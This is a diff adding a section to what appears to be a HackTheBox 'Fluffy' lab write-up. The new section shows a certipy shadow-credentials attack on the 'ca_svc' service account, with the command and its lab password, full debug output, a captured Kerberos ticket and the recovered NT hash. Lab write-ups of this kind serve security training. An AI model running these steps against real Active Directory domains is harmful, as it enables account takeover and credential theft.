@@ -324,3 +324,61 @@ net rpc group addmem "service accounts" "p.agila" -U "fluffy.htb"/"p.agila"%'pro
 Now im part of the group i have genericWrite over three service accounts
 
 Since i already tried cracking the kerberos hashes of these users earlier and failed the only option here is to apply shadow credentials
+
+# Compromising `ca_svc`
+```python
+faketime -f +7h certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -account 'ca_svc' -dc-host dc01.fluffy.htb -debug
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[+] Nameserver: None
+[+] DC IP: None
+[+] DC Host: 'dc01.fluffy.htb'
+[+] Target IP: None
+[+] Remote Name: 'dc01.fluffy.htb'
+[+] Domain: 'FLUFFY.HTB'
+[+] Username: 'P.AGILA'
+[+] Trying to resolve 'dc01.fluffy.htb' at '192.168.1.253'
+[!] DNS resolution failed: The DNS query name does not exist: dc01.fluffy.htb.
+Traceback (most recent call last):
+  File "/usr/lib/python3/dist-packages/certipy/lib/target.py", line 442, in resolve
+    answers = self.resolver.resolve(hostname, tcp=self.use_tcp)
+  File "/usr/lib/python3/dist-packages/dns/resolver.py", line 1306, in resolve
+    (request, answer) = resolution.next_request()
+                        ~~~~~~~~~~~~~~~~~~~~~~~^^
+  File "/usr/lib/python3/dist-packages/dns/resolver.py", line 750, in next_request
+    raise NXDOMAIN(qnames=self.qnames_to_try, responses=self.nxdomain_responses)
+dns.resolver.NXDOMAIN: The DNS query name does not exist: dc01.fluffy.htb.
+[+] Resolved 'dc01.fluffy.htb' from cache: 10.129.232.88
+[+] Authenticating to LDAP server using NTLM authentication
+[+] Using NTLM signing: False (LDAP signing: True, SSL: True)
+[+] Using channel binding signing: True (LDAP channel binding: True, SSL: True)
+[+] Using LDAP channel binding for NTLM authentication
+[+] LDAP NTLM authentication successful
+[+] Bound to ldaps://10.129.232.88:636 - ssl
+[+] Default path: DC=fluffy,DC=htb
+[+] Configuration path: CN=Configuration,DC=fluffy,DC=htb
+[*] Targeting user 'ca_svc'
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating Key Credential
+[*] Key Credential generated with DeviceID '00d351b27a6248959e069a5582fe9b15'
+[*] Adding Key Credential with device ID '00d351b27a6248959e069a5582fe9b15' to the Key Credentials for 'ca_svc'
+[*] Successfully added Key Credential with device ID '00d351b27a6248959e069a5582fe9b15' to the Key Credentials for 'ca_svc'
+[*] Authenticating as 'ca_svc' with the certificate
+[*] Certificate identities:
+[*]     No identities found in this certificate
+[*] Using principal: 'ca_svc@fluffy.htb'
+[*] Trying to get TGT...
+[+] Sending AS-REQ to KDC fluffy.htb (10.129.232.88)
+[*] Got TGT
+[*] Saving credential cache to 'ca_svc.ccache'
+[+] Attempting to write data to 'ca_svc.ccache'
+[+] Data written to 'ca_svc.ccache'
+[*] Wrote credential cache to 'ca_svc.ccache'
+[*] Trying to retrieve NT hash for 'ca_svc'
+[*] Restoring the old Key Credentials for 'ca_svc'
+[*] Successfully restored the old Key Credentials for 'ca_svc'
+[*] NT hash for 'ca_svc': ca0f4f9e9eb8a092addf53bb03fc98c8
+```
+So there is a cleanup script running so after adding the user to the group and checking i had disappeared so i had to re-add myself then quickly run this command
+
